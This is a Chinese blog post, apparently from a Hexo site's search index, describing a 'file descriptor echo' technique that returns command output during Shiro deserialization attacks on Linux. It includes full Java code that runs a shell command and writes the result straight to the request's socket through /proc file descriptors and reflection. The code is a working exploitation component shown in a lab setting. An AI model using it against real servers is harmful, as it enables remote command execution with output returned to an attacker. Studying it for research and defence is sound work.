<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux文件描述符回显</title>
    <url>/2021/08/19/Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%9B%9E%E6%98%BE/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>都知道在Shiro反序列化中是无回显的，此文章是基于Linux文件描述符进行回显。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>我使用的是<code>sprint boot</code>进行测试的<br>pom.xml如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">  &lt;groupId&gt;com.darkerbox&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;EaasyWeb&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">  &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">  &lt;name&gt;EaasyWeb Maven Webapp&lt;/name&gt;</span><br><span class="line">  &lt;!-- FIXME change it to the project&#x27;s website --&gt;</span><br><span class="line">  &lt;url&gt;http://www.example.com&lt;/url&gt;</span><br><span class="line"></span><br><span class="line">  &lt;properties&gt;</span><br><span class="line">    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;</span><br><span class="line">  &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">  &lt;parent&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.0.7.RELEASE&lt;/version&gt;</span><br><span class="line">  &lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">      &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;commons-net&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;commons-net&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;3.6&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">  &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">  &lt;build&gt;</span><br><span class="line">    &lt;finalName&gt;EaasyWeb&lt;/finalName&gt;</span><br><span class="line">    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span><br><span class="line">      &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;artifactId&gt;maven-war-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;3.2.2&lt;/version&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">          &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">          &lt;configuration&gt;</span><br><span class="line">            &lt;fork&gt;true&lt;/fork&gt;</span><br><span class="line">            &lt;mainClass&gt;com.darkerbox.App&lt;/mainClass&gt;</span><br><span class="line">          &lt;/configuration&gt;</span><br><span class="line">          &lt;executions&gt;</span><br><span class="line">            &lt;execution&gt;</span><br><span class="line">              &lt;goals&gt;</span><br><span class="line">                &lt;goal&gt;repackage&lt;/goal&gt;</span><br><span class="line">              &lt;/goals&gt;</span><br><span class="line">            &lt;/execution&gt;</span><br><span class="line">          &lt;/executions&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/plugins&gt;</span><br><span class="line">    &lt;/pluginManagement&gt;</span><br><span class="line">  &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>目录结构如下<br><img src="https://img-blog.csdnimg.cn/7cb69b023d6d484e9e5f72458b48c60a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTE4Nzcx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>App.java内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.darkerbox;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.EnableAutoConfiguration;</span><br><span class="line">import org.springframework.context.annotation.ComponentScan;</span><br><span class="line"></span><br><span class="line">@ComponentScan(value = &#123;&quot;com.darkerbox.controller&quot;&#125;)</span><br><span class="line">@EnableAutoConfiguration</span><br><span class="line"></span><br><span class="line">public class App &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(App.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我使用<code>mvn spring-boot:repackage</code>命令打包为jar包。然后放到kali里运行。</p>
<p>关于tomcat远程调试jar包参考：<a href="https://blog.csdn.net/qq_41918771/article/details/119737400">Tomcat远程调试jar</a></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们先通过人为模拟来寻找我们所能操控的文件描述符编号</p>
<p>先把spring boot的jar包运行起来<br><img src="https://img-blog.csdnimg.cn/3e17197b3d3d4114a00b29bee0bcd1e4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTE4Nzcx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>默认以ipv6监听，从下图看出<code>tcp6</code>这个文件应该内容都是一样的。有新的连接就会全部更新，感觉像是一个软连接。每个字段具体有什么作用参考：<a href="https://guanjunjian.github.io/2017/11/09/study-8-proc-net-tcp-analysis/">文件分析</a><br><img src="https://img-blog.csdnimg.cn/5b8878920c2546978ddc57082400e6c5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTE4Nzcx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用idea远程调试jar包，开启断点。<br>首先对spring boot发起一个请求。就会和kali建立起一个TCP连接，会成功断在idea中。这样比较清楚的看到tcp连接。这里可以很明显的发现存在交互的socket连接信息其中存在<code>-1</code>的字段，那么在本文的实验环境下是可以通过这个-1的标志位来取的，实际环境下不建议这么做。<br><img src="https://img-blog.csdnimg.cn/301fdd7e1cce43a2ac27d1500b82f645.png" alt="在这里插入图片描述"><br>这里我们要获取TCP连接的Inode号<code>205876</code>，至于什么是<code>Inode</code>号，不过多解释了。然后获取java spring boot那个进程的PID。找到这个进程打开的文件描述符。找到Inode号为<code>205876</code>的socket连接。<br><img src="https://img-blog.csdnimg.cn/c7fc6bb474b145c3a5df6ee1d38becc7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTE4Nzcx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>至此我们通过手工方法复现了寻找文件描述符的方法。下面用代码实现，也就是<code>LinuxFdHxController</code>文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.darkerbox.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.autoconfigure.EnableAutoConfiguration;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">* Linux 文件描述符回显链</span><br><span class="line">* */</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">@EnableAutoConfiguration</span><br><span class="line">public class LinuxFdHxController &#123;</span><br><span class="line">    @RequestMapping(&quot;/linuxhx&quot;)</span><br><span class="line">    public String test() throws IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException &#123;</span><br><span class="line">        // 首先获取命令执行的返回结果</span><br><span class="line">        String command = &quot;whoami&quot;;</span><br><span class="line">        java.util.List cmds = new java.util.ArrayList();</span><br><span class="line">        cmds.add(&quot;/bin/bash&quot;);</span><br><span class="line">        cmds.add(&quot;-c&quot;);</span><br><span class="line">        cmds.add(command);</span><br><span class="line">        ProcessBuilder pb = new ProcessBuilder(cmds);</span><br><span class="line">        pb.redirectErrorStream(true);</span><br><span class="line">        Process proc = pb.start();</span><br><span class="line">        byte[] out = new byte[1024 * 10];</span><br><span class="line">        proc.getInputStream().read(out);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //GetInode。获取Tcp连接对应的Inode。</span><br><span class="line">        java.io.File f1 = new java.io.File(&quot;/proc/thread-self/net/tcp6&quot;);</span><br><span class="line">        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(f1));</span><br><span class="line">        String line,slow_start_size_threshold,inode = &quot;&quot;;</span><br><span class="line">        while ((line = br.readLine()) != null) &#123;</span><br><span class="line">            String[] lineArr = line.split(&quot;\\s+&quot;);</span><br><span class="line"></span><br><span class="line">            if (lineArr.length == 18)&#123;</span><br><span class="line">                slow_start_size_threshold = lineArr[17];</span><br><span class="line">                java.util.regex.Pattern pattern = java.util.regex.Pattern.compile(&quot;^[-\\+]?[\\d]*$&quot;);</span><br><span class="line">                // 可以简单的理解为正则匹配整数，并且转换为整型 &lt; 0。即匹配的是-1。实际情况下不建议使用这种方法</span><br><span class="line">                if(pattern.matcher(slow_start_size_threshold).matches() &amp;&amp; Integer.parseInt(slow_start_size_threshold) &lt; 0) &#123;</span><br><span class="line">                    inode = lineArr[10];</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //getFdFile，</span><br><span class="line">        // 对于/proc/thread-self/fd这个文件。每个线程访问该文件都有不同的内容。当前请求的线程访问该文件，就会获取当前线程的文件描述符。然后通过inode找到对应的socket。最终获取到socket</span><br><span class="line">        String socketPath = &quot;&quot;;</span><br><span class="line">        java.io.File file = new java.io.File(&quot;/proc/thread-self/fd&quot;);</span><br><span class="line">        java.io.File[] fs = file.listFiles();</span><br><span class="line"></span><br><span class="line">        for (int i=0;i&lt;fs.length;i++) &#123;</span><br><span class="line">            java.io.File f = fs[i];</span><br><span class="line">            java.nio.file.Path path = java.nio.file.Paths.get(f.toString(), new String[]&#123;&quot;&quot;&#125;);</span><br><span class="line">            // 因为获取到的是软连接 通过readSymbolicLink可以获取软连接指向的socket。例如socket:[206282]</span><br><span class="line">            String link = java.nio.file.Files.readSymbolicLink(path).toString();</span><br><span class="line">            if (link.contains(inode)) &#123;</span><br><span class="line">                socketPath = f.toString();</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //getFd，因为已经获取到了请求的文件描述符。通过反射实例化FileDescriptor对象，并将fdId传入</span><br><span class="line">        Class clazz = Class.forName(&quot;java.io.FileDescriptor&quot;);</span><br><span class="line">        java.lang.reflect.Constructor m = clazz.getDeclaredConstructor(new Class[]&#123;Integer.TYPE&#125;);</span><br><span class="line">        m.setAccessible(true);</span><br><span class="line">        String[] fdArr = socketPath.split(&quot;/&quot;);</span><br><span class="line">        String fdId = fdArr[fdArr.length - 1];</span><br><span class="line">        java.io.FileDescriptor fd = (java.io.FileDescriptor) m.newInstance(new Object[]&#123;new Integer(fdId)&#125;);</span><br><span class="line"></span><br><span class="line">        //writeFd，将之前命令执行的结果写入fd。</span><br><span class="line">        String body = new String(out);</span><br><span class="line">        String response = &quot;HTTP/1.1 200 OK\r\n&quot;</span><br><span class="line">                + &quot;Content-Type: text/html\r\n&quot;</span><br><span class="line">                + &quot;Content-Length: &quot; + body.length()</span><br><span class="line">                + &quot;\r\n\r\n&quot;</span><br><span class="line">                + body</span><br><span class="line">                + &quot;\r\n\r\n&quot;;</span><br><span class="line"></span><br><span class="line">        java.io.FileOutputStream os = new java.io.FileOutputStream(fd);</span><br><span class="line">        os.write(response.getBytes());</span><br><span class="line">        os.close();</span><br><span class="line">        return &quot;a&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux文件/proc/net/tcp分析</span><br><span class="line">https://guanjunjian.github.io/2017/11/09/study-8-proc-net-tcp-analysis/</span><br><span class="line">Linux下文件描述符回显构造</span><br><span class="line">http://foreversong.cn/archives/1459</span><br><span class="line"></span><br><span class="line">https://note.f5.pm/go-23396.html</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
</search>
